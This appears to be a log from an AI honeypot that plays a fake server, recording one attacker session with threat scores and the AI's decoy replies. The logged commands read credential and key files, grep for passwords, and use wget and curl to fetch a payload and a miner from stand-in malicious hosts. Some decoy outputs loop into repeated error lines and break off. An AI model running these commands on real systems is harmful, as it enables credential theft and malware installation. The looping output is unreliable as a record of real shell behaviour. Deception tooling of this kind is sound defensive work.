        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 89,
        "risk_level": "CRITICAL",
        "final_score": 89,
        "threat_level": "CRITICAL",
        "base_score": 89,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 46,
            "unique_commands": 43,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 503,
            "commands_executed": 46,
            "successful_commands": 45,
            "failed_commands": 1,
            "files_accessed": 6,
            "services_accessed": 1,
            "engagement_score": 85,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 89,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,676 - {"session_id": "71dd20b2", "command": "cat /var/www/internal/dev_tasks.md", "attack_type": "Unknown", "risk_score": 89, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,676 - {
    "session_id": "71dd20b2",
    "command": "cat /var/www/internal/dev_tasks.md",
    "ai_decision": "# Cloud Migration dev tasks\n1. Staging API Gateway deployment:\n   Access the staging API gateway router at `staging-api-01.xynera.local` (`10.200.100.22`) via SSH.\n   Use the local private key stored in `/home/ubuntu/.ssh/id_rsa` (user: `ubuntu`).\n2. API secrets mapping:\n   Ensure the production environment variables inside `/home/ubuntu/.env` are synchronized to the API gateway.\n3. Database replication backup:\n   PostgreSQL schemas are dumped to `/var/www/internal/db_backup.sql`.\n   Ensure they are uploaded to the secure S3 bucket using the credentials in `/home/ubuntu/.aws/credentials`.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 46
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 89,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,676 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /var/www/internal/dev_tasks.md",
    "ai_decision": "# Cloud Migration dev tasks\n1. Staging API Gateway deployment:\n   Access the staging API gateway router at `staging-api-01.xynera.local` (`10.200.100.22`) via SSH.\n   Use the local private key stored in `/home/ubuntu/.ssh/id_rsa` (user: `ubuntu`).\n2. API secrets mapping:\n   Ensure the production environment variables inside `/home/ubuntu/.env` are synchronized to the API gateway.\n3. Database replication backup:\n   PostgreSQL schemas are dumped to `/var/www/internal/db_backup.sql`.\n   Ensure they are uploaded to the secure S3 bucket using the credentials in `/home/ubuntu/.aws/credentials`.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:14:47,768 - {
    "session_id": "71dd20b2",
    "query": "cat /etc/gateway/router.conf",
    "response": "# API Gateway Router configurations\n# Upstream configuration for public endpoints\nserver {\n    listen 8080;\n    server_name staging-api-01.xynera.local;\n\n    # Downstream services mapping\n    location /api/v1/users {\n        # Users data served from production database\n        proxy_pass http://prod-db-01.xynera.local:5432;\n    }\n\n    location /api/v1/backups {\n        # Backups log and status service\n        # To access backup archives on backup-node-02 (10.200.100.40), use the private SSH sync key:\n        # Key file path: /home/ubuntu/.ssh/backup_key (user: dev)\n        proxy_pass http://backup-node-02.xynera.local:873;\n    }\n}",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 94,
        "risk_level": "CRITICAL",
        "final_score": 94,
        "threat_level": "CRITICAL",
        "base_score": 94,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 47,
            "unique_commands": 44,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 504,
            "commands_executed": 47,
            "successful_commands": 46,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 94,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:14:47,769 - {"session_id": "71dd20b2", "command": "cat /etc/gateway/router.conf", "attack_type": "Privilege Enumeration", "risk_score": 94, "threat_level": "CRITICAL"}
2026-07-21 11:14:47,769 - {
    "session_id": "71dd20b2",
    "command": "cat /etc/gateway/router.conf",
    "ai_decision": "# API Gateway Router configurations\n# Upstream configuration for public endpoints\nserver {\n    listen 8080;\n    server_name staging-api-01.xynera.local;\n\n    # Downstream services mapping\n    location /api/v1/users {\n        # Users data served from production database\n        proxy_pass http://prod-db-01.xynera.local:5432;\n    }\n\n    location /api/v1/backups {\n        # Backups log and status service\n        # To access backup archives on backup-node-02 (10.200.100.40), use the private SSH sync key:\n        # Key file path: /home/ubuntu/.ssh/backup_key (user: dev)\n        proxy_pass http://backup-node-02.xynera.local:873;\n    }\n}",
    "confidence_score": 0.9,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 47
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.9
    },
    "risk_score": 94,
    "threat_level": "CRITICAL"
}
2026-07-21 11:14:47,769 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cat /etc/gateway/router.conf",
    "ai_decision": "# API Gateway Router configurations\n# Upstream configuration for public endpoints\nserver {\n    listen 8080;\n    server_name staging-api-01.xynera.local;\n\n    # Downstream services mapping\n    location /api/v1/users {\n        # Users data served from production database\n        proxy_pass http://prod-db-01.xynera.local:5432;\n    }\n\n    location /api/v1/backups {\n        # Backups log and status service\n        # To access backup archives on backup-node-02 (10.200.100.40), use the private SSH sync key:\n        # Key file path: /home/ubuntu/.ssh/backup_key (user: dev)\n        proxy_pass http://backup-node-02.xynera.local:873;\n    }\n}",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Privilege Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:15:03,606 - {
    "session_id": "71dd20b2",
    "query": "grep -r \"password\" /var/www",
    "response": "/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 95,
        "risk_level": "CRITICAL",
        "final_score": 95,
        "threat_level": "CRITICAL",
        "base_score": 95,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 48,
            "unique_commands": 45,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 504,
            "commands_executed": 48,
            "successful_commands": 47,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 95,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:15:03,606 - {"session_id": "71dd20b2", "command": "grep -r \"password\" /var/www", "attack_type": "Unknown", "risk_score": 95, "threat_level": "CRITICAL"}
2026-07-21 11:15:03,607 - {
    "session_id": "71dd20b2",
    "command": "grep -r \"password\" /var/www",
    "ai_decision": "/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 48
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 95,
    "threat_level": "CRITICAL"
}
2026-07-21 11:15:03,607 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: grep -r \"password\" /var/www",
    "ai_decision": "/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\n/bin/bash: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a directory\ngrep: /var/www/html/uploads: Is a",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:15:29,348 - {
    "session_id": "71dd20b2",
    "query": "wget http://malware.sh/payload.sh",
    "response": "[Guardrail] Unsafe security request detected.",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 103,
        "risk_level": "CRITICAL",
        "final_score": 103,
        "threat_level": "CRITICAL",
        "base_score": 103,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 49,
            "unique_commands": 46,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 519,
            "commands_executed": 49,
            "successful_commands": 48,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 103,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:15:29,348 - {"session_id": "71dd20b2", "command": "wget http://malware.sh/payload.sh", "attack_type": "Malware Download Attempt", "risk_score": 103, "threat_level": "CRITICAL"}
2026-07-21 11:15:29,348 - {
    "session_id": "71dd20b2",
    "command": "wget http://malware.sh/payload.sh",
    "ai_decision": "[Guardrail] Unsafe security request detected.",
    "confidence_score": 0.95,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 49
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.95
    },
    "risk_score": 103,
    "threat_level": "CRITICAL"
}
2026-07-21 11:15:29,348 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: wget http://malware.sh/payload.sh",
    "ai_decision": "[Guardrail] Unsafe security request detected.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Malware Download Attempt",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:15:46,396 - {
    "session_id": "71dd20b2",
    "query": "curl -O http://malicious-site.net/miner.exe",
    "response": "curl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to 